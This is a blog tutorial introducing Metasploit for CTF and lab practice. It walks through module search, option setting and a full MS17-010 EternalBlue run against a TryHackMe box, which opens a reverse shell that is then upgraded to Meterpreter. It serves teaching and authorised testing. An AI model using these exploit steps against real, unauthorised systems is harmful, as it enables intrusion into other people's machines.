---
layout: post
title: Beginner's Guide | Metasploit
excerpt_separator: <!--more-->
categories: [Instructional, Metasploit]
tags: [Guide]
---



## Introduction
{:.no_toc}

As you probably already know, Metasploit is an amazing tool/framework for offensive exercises, audits, and penetration tests. It includes functionality for exploit development and integration of plugins from all sorts of other tools. I built this guide in early 2020 to aide co-workers in understanding its functionality and help them in experimenting with it on CTF events and online cyber challenges, so I hope it's useful to others here interested in understanding the basics and building from there. For further reading, check the sources at the bottom of the guide!

<!--more-->

## Table of Contents
{:.no_toc}

1. TOC
{:toc}


## Primer - Metasploit

```bash
msfconsole [options]
```

To see the help page within Metasploit, simply type `?`.  If you want help with a specific command in Metasploit, such as the 'set' or 'sessions' command, just append the command after the `?`


```
- msf5 > ? set
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

- msf5 > ? sessions
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S <opt>  Row search filter.
    -c <opt>  Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n <opt>  Name or rename a session by ID
    -q        Quiet mode
    -s <opt>  Run a script or module on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6


```

Throughout Metasploit, the `options` or `show options` menu will provide a list of all the set-able flags.  This menu is contextual, so it will update to match whatever module is selected.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


```



## Metasploit-Framework Structure

MSF is organized into modules 7 categories: auxiliary, encoders, evasion, exploits, nops, payloads, post.  

```bash
❯ pwd && ls
/usr/share/metasploit-framework/modules
auxiliary  encoders  evasion  exploits  nops  payloads  post
```

We'll get more into what these do eventually, but it's important to understand how these are organized and sorted so you use the right one for each task.  

When interacting with modules within `msfconsole`, start with the module category.  For example, if you believe your target is a Windows machine that's running a vulnerable SMB service, you can sort through the `exploit` modules.

```
msf5 > use exploit/windows/smb/
use exploit/windows/smb/generic_smb_dll_injection
use exploit/windows/smb/group_policy_startup
use exploit/windows/smb/ipass_pipe_exec
use exploit/windows/smb/ms03_049_netapi
...
use exploit/windows/smb/smb_doublepulsar_rce
use exploit/windows/smb/smb_relay
use exploit/windows/smb/timbuktu_plughntcommand_bof
use exploit/windows/smb/webexec
```

MSF tries to keep modules sorted by type (such as exploit), then Operating System ('windows', 'apple_ios', etc), then service ('mssql', 'rdp', etc), then the name of the individual module.  For modules that involve multiple operating systems, it will show up as 'multi'.  



## Searching Metasploit

```
❯ msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.87-dev                          ]
+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion  
```



As you can see, MSF has a massive collection of modules to choose from.  In exploits alone, there are more than 2,000 exploits.  MSF modules are stored at:

```bash
❯ /usr/share/metasploit-framework/modules/
auxiliary/  encoders/   evasion/    exploits/   nops/       payloads/   post/  
```

While this structure is very sensible and makes it easy to understand what type of module you're looking for, it's extremely difficult to just navigate your way to the module you want.  For this reason, we should take advantage of the `search` function.

```
msf > use exploit/windows/ <tab>
Display all 1090 possibilities? (y or n)
```

As you can see above, there's 1090 exploits related to Windows alone... Scrolling through that list to find an exploit related to your scan results would be practically impossible.  

Let's take an example and see how much better it is using the search function:

#### Search Example (Hard Way)

Let's use the Metasploitable2 VM as an example case.  In this example, MS2 is running on 192.168.86.244 on my network.  Once it's up and running, I'm going to scan it with nmap using some of the options from [my Beginner's Guide to Nmap](/Nmap-Beginners-Guide).  

```
msf5 > nmap -F -A -T5 -vv 192.168.86.244 -oN nmap_example.txt
[*] exec: nmap -F -A -T5 -vv 192.168.86.244 -oN nmap_example.txt

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 06:15 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
...
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 64 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.86.37
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status

```

Looking at the first port in the results, we see that vsFTPd 2.3.4 is running, and has anonymous FTP login allowed.  If we look toward the end of the nmap results, we see the machine is running Linux 2.6.X.

```
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
```

And this appears to be backed up my nmap's `smb-os-discovery` script a bit further down:

```
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2020-05-15T07:15:51-04:00
```

Now that we have these results, we know that we're looking at a Unix/Linux machine which is running vsFTPd version 2.3.4.  Let's use the 'point-and-click' approach with MSF and see if we find what we want.  First I'm going to type `use` to tell MSF that I want to use a module from it's collection, then start into exploit/linux and use tab-completion to see how many results are left:

```
msf5 > use exploit/linux/ <tab> <tab>
Display all 300 possibilities? (y or n)
```

Not great, let's see whether I can sort to exploit/linux/ftp, since I know `vsFTPd` is an FTP service:

```
msf5 > use exploit/linux/ftp/proftp_
use exploit/linux/ftp/proftp_sreplace    use exploit/linux/ftp/proftp_telnet_iac
```

Nope, not there.  Let's check exploit/unix instead:

```
msf5 > use exploit/unix/
Display all 195 possibilities? (y or n)
```

Now, let's try exploit/unix/ftp since 195 is way too many:

```
msf5 > use exploit/unix/ftp/
use exploit/unix/ftp/proftpd_133c_backdoor  use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/ftp/proftpd_modcopy_exec
```

And there we have it!  vsftpd_234_backdoor looks like exactly what we want (remember, we wanted something targeting version 2.3.4.)  Go ahead and complete the process by running `use exploit/unix/ftp/vsftpd_234_backdoor`, then type `info` to get details about this module

```
msf5 > info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03
...
Description:
  This module exploits a malicious backdoor that was added to the
  VSFTPD download archive. This backdoor was introduced into the
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011
  according to the most recent information available. This backdoor
  was removed on July 3rd 2011.
...
```

There is a ton of information here, but the key detail is that it's highly ranked (Excellent), and it appears it matches our Platform (Unix) and version (v2.3.4).  

Note:  You can also run `info exploit/unix/ftp/vsftpd_234_backdoor` to see the same information without actively selecting the module.  There's no difference in functionality.



#### Search Example (Easy Way)

Now, let's try searching MSF for `vsftpd` and see what comes back.  

```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

Well... That looks like exactly what we want!  It's even showing the exact same version number.  You can see that it's the same path `exploit/unix/ftp/vsftdp_234_backdoor`, but this time we get all the information we need without having to run the `info` command.  We can see that it's ranked "excellent" and that it's targeting vsFTPd v2.3.4.  One additional detail that isn't explicitly mentioned is that this module does not run a "Check" against the target for the vulnerability.  This is important.  Some (very few) modules are able to determine whether the target is vulnerable to an exploit without actually exploiting it.  However, this functionality isn't all that reliable, so it's not too important that there is no ability for this module to check anyway.  To `use` this module, simply refer to the `#` of the result you want.  In this case, there is only one result (`0`), so we'll use that.

```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

msf5 > use 0
msf5 exploit(unix/ftp/vsftpd_234_backdoor) >
```

When you `use` a module, you'll see the MSF prompt change to indicate the type (exploit) and path (unix/ftp/vsftpd_234_backdoor) or the active module.

#### OK, Search is cool and all, but can it be easier?

As I mentioned earlier about the `options` menu, MSF is contextually aware.  When looking for modules, this also applies to the search and use functionality.  For example, if you already know that (or think you know) the module you want to use, you can tell MSF to `use <module name>` and it will conduct a search just like before.  If there is only one result, like in our example case with vsftpd, then it will switch to that module.  Otherwise, it will provide the list of results for your query and wait for you to decide with module you want using the `use #`.

```
msf5 > use vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


[*] Using exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) >
```

```
msf5 > use psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/admin/smb/psexec_command                            normal     No     Microsoft Windows Authenticated Administration Utility
...
   10  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   11  exploit/windows/smb/psexec_psh               1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
   12  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution

msf5 > use 10
msf5 exploit(windows/smb/psexec) >
```



## Module Options

Once a module is loaded, it needs to be configured for your target.  This includes setting the `RHOST` or `RHOSTS` - Remote or target host; `RPORT` - Remote or target port, and other options or flags depending on the specifics of the module.  The `info` command includes all of the options within the module, but simply running `options` is the best way to see what you need to do before executing the exploit.  

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Importantly, you should always check whether your RHOSTS IP is your target, and you cannot run a module until all 'Required' options are set.  To set my target IP, I'm going to run `set RHOSTS 192.168.86.244` and then re-run the `options` command to ensure it's properly set.

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.86.244
rhosts => 192.168.86.244
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.86.244   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

While the `set` command is great for per-module tasks, you can also use `setg` for set-global to automatically fill the `RHOSTS` setting to the same IP whenever you load a module.  This can be great for things like CTFs or practicing exploits against a box like metasploitable, where there are many different vulnerabilities that can be used to access the system.  

```
msf5 > setg RHOSTS 192.168.86.244
```

Additionally, keep in mind that some modules use `RHOST` (singular) instead of `RHOSTS`.  This was originally designed as a method of separating MSF auxiliary modules like scanners (which would use RHOSTS since they tend to target a range of devices) from MSF exploit modules (which usually only target one device at a time).  As of late 2018, the expectation is for RHOSTS to be the only option, so you should be fine with simply setting RHOSTS either per-module (using `set rhost X`) or globally (using `setg rhost X`), but always check the `options` before running an exploit.

## Exploiting a Vulnerability

For the sake of example and because it's easy, we'll demonstrate using MSF to exploit a simple vulnerability.  One easy way to create a good test environment for this is to use a box like [TryHackMe's Blue Room](https://tryhackme.com/room/blue), since we know that machine is vulnerable to EternalBlue, so we can take advantage of that system to test over the VPN.  Another option is to spin up our own virtual machine with known vulnerabilities, such as [Metasploitable2](https://metasploit.help.rapid7.com/docs/metasploitable-2) or [Metasploitable3](https://github.com/rapid7/metasploitable3).  Metasploitable2 is a few years old, but it's a version of linux with countless services installed that are almost all vulnerable.  Metasploitable3 is somewhat newer and includes both an Ubuntu box with known vulnerabilities as well as a Windows machine.

Metasploitable2 has an [exploitability guide](https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide) that lists all the exposed ports and vulnerabilities.  Metasploitable3 has a [similar GitHub Wiki](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities) with everything you need to test out exploits and vulnerabilities.

For this example, I'm going to use TryHackMe's [Blue Room](https://tryhackme.com/room/blue), since the EternalBlue (ms17_010_eternalblue) exploit is pretty reliable.  I'll just target that host (in my case, the IP is 10.10.214.103), and then check options to make sure everything is configured correctly, then `run` the exploit:

```
msf5  exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.214.103    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

msf5 > run
[*] Started reverse TCP handler on 10.2.8.137:4444
[*] 10.10.214.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.214.103:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.214.103:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.214.103:445 - Connecting to target for exploitation.
...
[+] 10.10.214.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.214.103:445 - Sending egg to corrupted connection.
[*] 10.10.214.103:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.2.8.137:4444 -> 10.10.214.103:49187) at 2020-06-01 08:29:25 -0500
[+] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

C:\Windows\system32>
```

Keep in mind, this process may take a few tries.  Let it run all the way through, and don't worry if you see lines like:

```
[-] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

With the EternalBlue exploit in particular, it plays with the target's buffer until it is able to execute the exploit effectively.

## Meterpreter!

Now, having a shell is awesome, and we can use this to do all sorts of things, but we're limited to the level of access of the process we're attached to, and it's difficult to create persistence.  For these reasons, MSF has Meterpreter!  

> Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.


That's a lot of heavy-duty verbiage, so let's break it down.

`dynamically extensible payload` - This means that you can build an add extensions to Meterpreter, even after you've started running it on a target.  If you start working on a target, then realize you need to use an extension, you can simply `load` it and your host will send the extension to Meterpreter, adding the functionality on the fly!

`uses in-memory DLL injection stagers` - Meterpreter does not sit on the hard drive, so it's invisible to standard anti-virus and file system scans.

`comprehensive client-side Ruby API` - Just like Metasploit, it's built with Ruby, so much of the functionality from Metasploit translates to commands through Meterpreter.  This means you can use your Meterpreter shell to scan, enumerate, and exploit other devices that you normally wouldn't be able to target directly, such as devices behind a firewall!

`command history, tab completion, channels, and more` - Tons of additional functionality exists with Meterpreter.

We'll get into all the different functions and features of Meterpreter another day, but here's how to get to Meterpreter once you have a command shell access on a box:

Ctrl-Z or `background` to background your shell and go back to Metasploit.

Once in Metasploit, you can rely on Metasploit's built-in session upgrade function to upgrade a shell to a meterpreter session.  This works on most target OSes.

```
msf5 > sessions
 -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S <opt>  Row search filter.
    -c <opt>  Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n <opt>  Name or rename a session by ID
    -q        Quiet mode
    -s <opt>  Run a script or module on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```

Run `sessions` to check the session number for your target shell.  If you haven't exploited any other targets since opening Metasploit, this should be session 1

```
msf5 > sessions

Active sessions
===============

  Id  Name  Type               Information
                                  Connection
  --  ----  ----               -----------
                                  ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.2.8.137:4444 -> 10.10.214.103:49187 (10.10.214.103)
```

Now, upgrade the session:

```
msf5 > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.8.137:4433
[*] Sending stage (176195 bytes) to 10.10.214.103
[*] Meterpreter session 2 opened (10.2.8.137:4433 -> 10.10.214.103:49213) at 2020-06-01 08:51:47 -0500
[*] Stopping exploit/multi/handler
[*] Starting interaction with 2...

meterpreter >
```

With a Meterpreter shell, you can now do all sorts of things on the target, provided the process Meterpreter is attached to has high enough permissions.  We'll get into all the different functionality available with Meterpreter in another document, but you can check out [Offensive Security's in-depth chapter on Meterpreter here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).



## Database Functionality

MSF comes with an excellent set of database capabilities out of the box.  When used, msfdb allows you to save nmap results, enumerate networks, and even store observed and exploited vulnerabilities for later use.

To utilize the MSF Database functionality, simply start the PostgreSQL service, then initialize the MSF database:

```bash
sudo systemctl start postgresql
msfdb init
```

To check the status of MSF's connection to the database:

```
msf > db_status
```

If it's connected right, it will look like this:

```
[*] Connected to msf. Connection type: postgresql.
```

MSF uses "workspaces" to sort interact with the database

```
msf5 > ? workspace
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r <old> <new>   Rename workspace
    workspace -h               Show this help information

msf5 > workspace -v

Workspaces
==========

current  name     hosts  services  vulns  creds  loots  notes
-------  ----     -----  --------  -----  -----  -----  -----
*        default  1      30        0      0      0      29
         test     1      35        0      0      0      82

```



For a list of commands that pull data from the database or add data to the database, type `? database`.

```
msf5 > ? database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
```

We'll go in-depth on how to use Metasploit's database functionality in a later chapter, but it's a great idea to learn this early on so you can store data from nmap scans, and reference them during later metasploit sessions, instead of having to manually note your findings as you go.

## Sources

Sources:

[Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed)

[Exploit-DB's "Easiest Metasploit Guide You'll Ever Use"](https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%E2%80%99ll-ever-read.pdf)